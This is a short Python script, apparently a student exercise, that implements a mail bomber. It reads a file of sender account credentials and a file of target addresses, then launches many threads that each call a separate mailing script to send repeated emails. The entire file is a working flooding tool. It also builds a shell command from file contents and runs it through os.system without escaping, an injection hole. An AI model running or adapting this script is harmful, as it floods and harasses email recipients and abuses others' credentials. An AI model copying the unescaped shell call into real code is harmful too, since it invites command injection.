#!/usr/bin/env python

import os, sys, threading, time

loop = int(sys.argv[1])
threads = []
looping = 1


class MailBomb(threading.Thread):
    def run(self):
        try:
            nom = self.getName()
            nom = nom.split(' ')
            command = "python exercice_cinq.py {} {} {}".format(nom[0], nom[1], nom[2])
            os.system(command)
            print('Email sent by {}'.format(nom[0]))
        except:
            print('Erreur d\'envoi')


for x in range(0, loop):
    for count, targets in enumerate(open(sys.argv[3])):
        for cnt, user in enumerate(open(sys.argv[2])):
            user = user.split()
            username = user[0]
            password_user = user[1]
            threads.append(MailBomb(name='{} {} {} {}'.format(username, password_user, targets, looping)))
            looping = looping + 1
for y in threads:
    y.start()
    time.sleep(0.25)
